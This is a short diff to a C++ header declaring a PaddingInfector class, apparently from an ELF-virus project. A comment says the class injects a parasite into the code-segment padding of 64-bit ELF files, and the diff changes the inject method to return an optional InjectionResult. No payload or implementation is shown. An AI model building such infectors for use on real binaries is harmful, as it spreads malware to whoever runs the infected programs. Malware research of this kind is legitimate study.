@@ -1,6 +1,8 @@
 #pragma once
 #include <elf.h>
+#include <optional>
 #include <span>
+#include "infector/injection_result.hh"
 
 namespace vt::infector {
 // This algorithm injects a parasite into an 64 bit elf's code segment padding,
@@ -50,8 +52,9 @@ class PaddingInfector {
   bool analyze(std::span<const std::byte> host_mapping,
                std::span<const std::byte> parasite_mapping);
 
-  bool inject(std::span<std::byte> host_mapping,
-              std::span<const std::byte> parasite_mapping);
+  std::optional<InjectionResult> inject(
+      std::span<std::byte> host_mapping,
+      std::span<const std::byte> parasite_mapping);
 
  private:
   size_t host_size_{};
